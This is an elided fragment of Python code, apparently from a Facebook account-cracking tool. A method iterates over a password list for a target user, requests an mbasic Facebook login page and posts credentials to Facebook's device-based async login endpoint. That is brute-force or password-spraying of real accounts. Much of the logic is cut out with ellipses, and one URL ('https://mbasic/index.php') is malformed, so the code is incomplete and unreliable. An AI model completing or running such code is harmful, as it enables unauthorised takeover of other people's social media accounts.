    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        try:
            for pw in __chi__:
                ...
                r = session.get(f"https://mbasic/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                ...
                po = session.post(f"https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = das, headers = header1, allow_redirects = False)
